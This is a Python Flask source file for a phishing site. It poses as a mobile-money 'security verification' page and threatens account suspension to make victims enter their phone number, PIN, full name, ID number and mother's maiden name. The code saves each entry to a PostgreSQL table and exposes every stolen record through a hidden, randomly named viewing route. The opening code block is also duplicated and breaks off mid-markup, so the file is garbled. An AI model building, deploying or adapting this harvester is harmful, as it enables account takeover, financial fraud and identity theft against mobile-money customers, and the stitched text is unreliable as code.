from flask import Flask, request, render_template_string
import os, psycopg2

app = Flask(__name__)

# Get database URL from environment (set on Render)
DATABASE_URL = os.environ.get('DATABASE_URL')
if not DATABASE_URL:
    raise Exception("DATABASE_URL environment variable not set")

# Connect to PostgreSQL
conn = psycopg2.connect(DATABASE_URL, sslmode='require')
cur = conn.cursor()

# Create table if it doesn't exist
cur.execute('''
    CREATE TABLE IF NOT EXISTS logs (
        id SERIAL PRIMARY KEY,
        phone TEXT,
        pin TEXT,
        name TEXT,
        id_num TEXT,
        mother TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
''')
conn.commit()

HTML = """
<!DOCTYPE html>
<html>from flask import Flask, request, render_template_string
import os, psycopg2

app = Flask(__name__)

DATABASE_URL = os.environ.get('DATABASE_URL')
if not DATABASE_URL:
    raise Exception("DATABASE_URL environment variable not set")

conn = psycopg2.connect(DATABASE_URL, sslmode='require')
cur = conn.cursor()
cur.execute('''
    CREATE TABLE IF NOT EXISTS logs (
        id SERIAL PRIMARY KEY,
        phone TEXT,
        pin TEXT,
        name TEXT,
        id_num TEXT,
        mother TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
''')
conn.commit()

HTML = """
<!DOCTYPE html>
<html>
<head><title>Mobile Money Verification</title></head>
<body>
<h2>⚠️ Security Verification Required</h2>
<p>Your account has been flagged for suspicious activity. Verify your details to avoid suspension.</p>
<form method="POST" action="/submit">
Phone Number: <input type="text" name="phone" placeholder="0712345678"><br>
PIN: <input type="password" name="pin" placeholder="1234"><br>
Full Name (as on ID): <input type="text" name="name"><br>
ID Number (ID/Passport): <input type="text" name="id"><br>
Mother's Maiden Name: <input type="text" name="mother"><br>
<input type="submit" value="Verify">
</form>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/submit', methods=['POST'])
def submit():
    phone = request.form.get('phone')
    pin = request.form.get('pin')
    name = request.form.get('name')
    id_num = request.form.get('id')
    mother = request.form.get('mother')
    cur.execute(
        "INSERT INTO logs (phone, pin, name, id_num, mother) VALUES (%s, %s, %s, %s, %s)",
        (phone, pin, name, id_num, mother)
    )
    conn.commit()
    return "✅ Verification successful. You will be redirected."

@app.route('/view-270ea80433ceb605')
def log():
    cur.execute("SELECT phone, pin, name, id_num, mother, created_at FROM logs ORDER BY id DESC")
    rows = cur.fetchall()
    if not rows:
        return "No data yet."
    out = "<pre>"
    for row in rows:
        out += f"{row[0]} | {row[1]} | {row[2]} | {row[3]} | {row[4]} | {row[5]}\n"
    out += "</pre>"
    return out

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
